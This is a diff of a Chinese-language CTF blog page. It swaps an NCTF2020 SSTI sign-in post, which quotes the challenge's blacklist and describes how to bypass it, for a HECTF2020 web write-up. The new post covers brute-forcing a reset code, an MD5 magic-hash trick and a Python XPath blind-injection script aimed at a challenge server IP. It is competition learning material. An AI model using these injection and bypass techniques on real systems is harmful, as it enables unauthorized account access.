@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">NCTF2020签到摸鱼 | Troy3e</title>
+  <title itemprop="name">HECTF2020-Web | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -346,11 +346,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-734139.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-734139.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      NCTF2020签到摸鱼</h1>
+      HECTF2020-Web</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -376,17 +376,28 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>NCTF的难度以现在的水平还是太勉强了，只有这个签到是个正常题，别的基本都是取自真实渗透过程，或许明年才能够打出成绩。</p>
-<p>Web签到-你就是我的master吗</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123211400.png" alt=""></p>
-<p>有一说一这签到题虽然比较简单，但是居然也只有五十个解。</p>
-<p>题目环境关了，靠印象描述一下吧。总之就是非常可爱，啊不对，总之就是有个name参数，传啥返回啥，那就是ssti了。<br>一开始想着签到题怎么可能难呢，直接找了个库存ssti payload，结果被出题人无情嘲讽了一波~<br>既然有黑名单，那就先fuzz一波，然后在制定绕过的方案。</p>
-<p>官方wp给出了blacklist：<br>blacklist = [‘%’,’-‘,’:’,’+’,’class’,’base’,’mro’,’_’,’config’,’args’,’init’,’global’,’.’,’&#39;‘,’req’,’|’,’attr’,’get’]<br>值得一提的是在比赛的时候加号并没有被过滤，但是这影响并不大。<br>我们需要构造的语句是：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123212903.png" alt=""></p>
-<p>1、单引号的绕过：全部用双引号代替。<br>2、下划线的绕过：16进制绕过，\x5f\x5f<br>3、calss、global等函数：用加号拼接（也可全部用16进制绕过）<br>4、.的绕过：用方括号绕过</p>
-<p>最终payload：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123212622.png" alt=""></p>
-<p>好了，NCTF2020之旅结束。<br>看着剩下的那些神仙题，发现自己不会的、不清楚的地方还是太多了，不多说了，好好学习。</p>
+          <p>HECTF比较简单，和隔壁NCTF简直天差地别。。。不过人家这是新生赛。<br>先说下成绩，最高18名，还有半天的时间，继续c的话肯定能进线下，前十都有可能。<br>但是想了想，进线下第一没时间第二没钱第三学校不认证书第四觉得自己硬实力不够。<br>然后就放了没打，最后也是二十多名，前三十要交的wp也懒得交了，我就在这写一写Web的吧。</p>
+<p>一、签到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123213809.png" alt=""></p>
+<p>hint.php提示爆破，但显然，直接爆破密码是没脑子的行为。<br>爆破点在忘记密码里面的验证码，爆出来是0233<br>改密码登录即可。</p>
+<p>二、ezphp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123213954.png" alt=""></p>
+<p>阿这，这md5我都懒得写了。。。<br>脚本跑个md5值是0e开头但后面包含c的数字就行。</p>
+<p>三、ssrfme</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201123214143.png" alt=""></p>
+<p>第九届极客大挑战原题</p>
+<p>四、injection<br>XPATH盲注，啥都没过滤，也是右手就行<br>脚本：</p>
+<pre><code>import requests
+
+url = &quot;http://114.55.165.246:8082?username=&#39;or substring((//user[position()=1]/                   password[position()=1]),28,1)=&#39;{}&#39;  or &#39;&#39;=&#39;&amp;password=10&amp;submit=%E7%99%BB%E5%BD%95&quot;
+for i in range(30,128):
+    url1=url.format(chr(i))
+    a = requests.get(url=url1)
+    print(a.text)
+    if &quot;登录成功you login as admin but username not admin&quot;  in a.text:
+        print(i)
+        print(url1)
+        break</code></pre><p>下面还有个时间盲注永奇学长做出来了，我当时已经放了就没看，总之题比较简单，也没有很想c的欲望。</p>
 
         </div>
         <!-- .entry-content -->
@@ -415,36 +426,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/11/23/HECTF2020-Web/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-700733.png">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                HECTF2020-Web</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/11/20/RCTF-2019-Nextphp/" rel="next">
+            <a href="/2020/11/23/NCTF2020%E7%AD%BE%E5%88%B0%E6%91%B8%E9%B1%BC/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1114164.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1114164.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-734139.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-734139.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [RCTF 2019]Nextphp</h3>
+                NCTF2020签到摸鱼</h3>
                 <hr>
               </div>
             </a>
